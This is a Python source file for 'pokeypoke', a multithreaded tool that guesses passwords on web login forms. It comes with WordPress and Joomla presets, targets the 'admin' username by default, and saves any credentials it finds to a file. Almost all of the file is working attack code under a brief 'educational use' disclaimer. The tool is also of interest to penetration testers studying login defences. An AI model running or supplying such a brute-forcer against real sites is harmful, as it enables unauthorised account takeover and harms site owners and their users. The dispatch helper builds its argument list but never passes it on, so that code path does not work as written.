#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# * * * * * * * * * * * * * * * * * * * *
#   pokeypoke.py : login form brute force pentester
#   Requires python3, requests, BeautifulSoup4
#   ! DISCLAIMER                                              !
#   ! For educational use and penetration testing ONLY        !
#   ! Any liability for misuse lies solely on the script user !
# * * * * * * * * * * * * * * * * * * * *
#
#   MIT License
#
#   Copyright (c) 2017 William Normandin
#
#   Permission is hereby granted, free of charge, to any person obtaining a copy
#   of this software and associated documentation files (the "Software"), to deal
#   in the Software without restriction, including without limitation the rights
#   to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
#   copies of the Software, and to permit persons to whom the Software is
#   furnished to do so, subject to the following conditions:
#
#   The above copyright notice and this permission notice shall be included in all
#   copies or substantial portions of the Software.
#
#   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#   IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
#   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
#   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
#   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
#   OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
#   SOFTWARE.
#
# * * * * * * * * * * * * * * * * * * * *


from requests import Session
import threading
import datetime
import sys
import argparse
from queue import Queue
from bs4 import BeautifulSoup
import time

this = sys.modules[__name__]
VERSION = '0.1a (Development Version)'


def cli(arg_list=None):
    def handle_args():
        if args.wp and args.joomla:
            cprint('[*] Choose either --wp or --joomla', Color.ERR)
            sys.exit()
        if args.wp:
            this.args.uname_field = 'log'
            this.args.passwd_field = 'pwd'
            this.args.success_str.append('Welcome to your WordPress Dashboard!')
        if args.joomla:
            this.args.uname_field = 'username'
            this.args.passwd_field = 'passwd'
            this.args.success_str.append('Control Panel')

    parser = argparse.ArgumentParser()
    parser.add_argument('-m', '--max-threads', type=int, default=5, help='Maximum concurrent worker threads')
    parser.add_argument('-w', '--word-list', type=str, help='Path to word list', required=True)
    parser.add_argument('-t', '--target', type=str, nargs='*', help='Target URL(s)', required=True)
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('-C', '--nocolor', action='store_true', help='Suppress colors in output')
    parser.add_argument('-u', '--uname-field', default='username', help='Login form username field name')
    parser.add_argument('-p', '--passwd-field', default='passwd', help='Login form password field name')
    parser.add_argument('-r', '--resume', type=str, help='Resume from a certain word (for termed attempts)')
    parser.add_argument('-s', '--success-str', nargs='*', default=['Logged In'], help='Successful login identifier string(s)')
    parser.add_argument('-U', '--username', default=['admin'], nargs='*',
                        help='Login username(s) to attempt')
    parser.add_argument('-o', '--outfile',
                        default='creds.{}.txt'.format(datetime.datetime.now().strftime('%Y%m%d-%H%M%S')),
                        help='Discovered credential output')
    parser.add_argument('--wp', action='store_true', help='Use WordPress form element names')
    parser.add_argument('--joomla', action='store_true', help='Use Joomla form element names')
    if arg_list is None:
        this.args = parser.parse_args()
    else:
        this.args = parser.parse_args(arg_list)
    handle_args()

def display_args():
    col = Color.BLUE
    pre = ' -  '    # Default line prefix
    cprint('[*] Argument Summary', Color.MSG, True)
    report_list = [
            ('Target(s)', ', '.join(args.target)),
            ('Max Threads', args.max_threads),
            ('Word List', args.word_list),
            ('Username Field', args.uname_field),
            ('Password Field', args.passwd_field),
            ('Resume On', args.resume),
            ('Success String(s)', ', '.join(args.success_str)),
            ('Verbose', args.verbose),
            ('No Color', args.nocolor),
            ('Username(s)', ', '.join(args.username)),
            ('Output File', args.outfile),
            ('WordPress', args.wp),
            ('Joomla', args.joomla)
            ]
    for key, val in report_list:
        msg = '{}{:<20}: {}'.format(pre, key, val)
        cprint(msg, col, True)

def cprint(val, col=None, verbose=False):
    if not args.verbose and verbose:
        return
    if col==None:
        msg = val
    else:
        msg = color_wrap(val, col)
    print(msg)

def color_wrap(val, col):
    if args.nocolor:
        return str(val)
    return ''.join([col, str(val), Color.END])

class Color:
    BLACK_ON_GREEN = '\x1b[1;30;42m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    MSG = '\x1b[1;32;44m'
    ERR = '\x1b[1;31;44m'
    TST = '\x1b[7;34;46m'

def list_builder():
    with open(args.word_list) as wl:
        w_list = wl.readlines()
    _resume = False
    words = Queue()
    for w in [wrd.rstrip() for wrd in w_list]:
        if args.resume is not None:
            if _resume:
                words.put(w)
            else:
                if w == args.resume:
                    _resume = True
                    cprint(' -  Resuming from {}'.format(args.resume), Color.DARKCYAN)
        else:
            words.put(w)
    cprint(' -  Found {} words'.format(words.qsize()), Color.BLUE, True)
    return words


class CMSBrute:

    ''' CMSBrute Class:: pass in the default username, password list (via a queue), and target.

    The bruter then caches the login form with hidden fields, creating a cookied session. The
    web_bruter method is started in child threads and allowed to complete.  Uses the HTMLParser
    class to extract login form fields and hidden tags.
    '''

    def __init__(self, word_q):
        self.pass_q = word_q
        self.success = False
        self.run_event = threading.Event()
        self.threads = []

    def run(self, target):
        try:
            self.run_event.set()
            for i in range(args.max_threads):
                t = threading.Thread(target=self.web_bruter, args=(target,))
                t.start()
                self.threads.append(t)
            while not self.pass_q.empty() and self.run_event.is_set():
                time.sleep(3)
            if self.pass_q.empty():
                self.run_event.clear()
                for t in self.threads:
                    t.join()
        except KeyboardInterrupt:
            self.run_event.clear()
            for t in self.threads:
                t.join()
            cprint(' -  Resume on: {}'.format(self.pass_q.get()), Color.DARKCYAN)
            return False
        return True

    def web_bruter(self, target):
        while not self.pass_q.empty() and not self.success and self.run_event.is_set():
            attempt = self.pass_q.get().rstrip()
            cprint(' -  Trying {}, {} words remain'.format(attempt, self.pass_q.qsize()), Color.BLUE, True)
            sess = Session()
            tags = {i.get('name'):i.get('value') for i in
                   BeautifulSoup(sess.get(target).text, 'html.parser').find('form').find_all('input', type='hidden')}
            tags[args.passwd_field] = attempt
            for uname in args.username:
                tags[args.uname_field] = uname
                response = sess.post(target, data=tags)
                for item in args.success_str:
                    if response.status_code != 200:
                        cprint(' !  {} : HTTP {}'.format(target, response.status_code), Color.RED)
                    if item in response.text:
                        cprint(' -  Logged in: {}'.format(item), Color.GREEN, True)
                        self.success = True
                        cprint('[!] Target: {} :: Password for {}: {}'.format(target, uname, attempt), Color.GREEN)
                        with open(args.outfile, 'a') as of:
                            cprint(' -  Writing output to {}'.format(args.outfile), Color.DARKCYAN)
                            of.write('{}:username={}:password={}\n'.format(target, uname, attempt))
                        self.run_event.clear()
                        return
            self.pass_q.task_done()
            sess.cookies.clear()


def dispatch(**kwargs):
    '''
        Dispatch Function for non-cli usage

        - Flags are assumed to be True if present (verbose, nocolor)
        - Required values are word_list (path to word list) and target (target domain)

        # Run with defaults
        dispatch(word_list='/path/to/list.txt', target='https://target.domain/login.php')

        # Run with custom options
        dispatch(word_list='/path/to/list.txt', target='https://target.domain/login.php',
                 max_threads=2, verbose=True, wp=True)
    '''
    assert __name__ != '__main__'
    assert 'word_list' in kwargs
    assert 'target' in kwargs
    arg_list = []
    for key in kwargs:
        arg_list.append('--{}'.format(key))
        if not isinstance(kwargs[key], bool):
            arg_list.append(kwargs[key])
    cli()
    display_args()
    for target in args.target:
        br = CMSBrute(list_builder())
        if not br.run(target):
            break


if __name__=='__main__':
    cli()
    cprint('[*] PokeyPoke v{}'.format(VERSION), Color.MSG)
    display_args()
    for target in args.target:
        cprint(' -  Seeking target: {}'.format(target), Color.DARKCYAN)
        br = CMSBrute(list_builder())
        result = br.run(target)
        if not result:
            break
    cprint('[*] Completed', Color.MSG)
